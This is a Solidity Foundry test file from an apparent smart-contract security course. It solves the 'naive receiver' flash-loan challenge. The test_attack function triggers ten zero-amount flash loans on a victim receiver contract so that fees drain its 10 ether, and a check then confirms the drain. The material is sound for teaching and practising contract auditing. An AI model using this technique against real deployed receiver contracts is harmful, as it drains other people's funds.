// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "week10-11-security2/naive-receiver/FlashLoanReceiver.sol";
import "week10-11-security2/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverTest is Test {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    function setUp() external {
        pool = new NaiveReceiverLenderPool();
        receiver = new FlashLoanReceiver(address(pool));

        vm.deal(address(pool), 1000 ether);
        vm.deal(address(receiver), 10 ether);
    }

    function test_setUp() external {
        assertEq(address(pool).balance, 1000 ether);
        assertEq(pool.maxFlashLoan(pool.ETH()), 1000 ether);
        assertEq(pool.flashFee(pool.ETH(), 0), 1 ether);

        // Validate that an invalid call to onFlashLoan() will revert
        // This catch doesn't work for some reason
        // vm.expectRevert();
        // receiver.onFlashLoan(address(this), pool.ETH(), 10 ether, 1 ether, "");

        assertEq(address(receiver).balance, 10 ether);
    }

    function test_attack() external {
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");
        pool.flashLoan(receiver, pool.ETH(), 0, "");

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(pool).balance, 1000 ether + 10 ether);
        assertEq(address(receiver).balance, 0);
    }
}
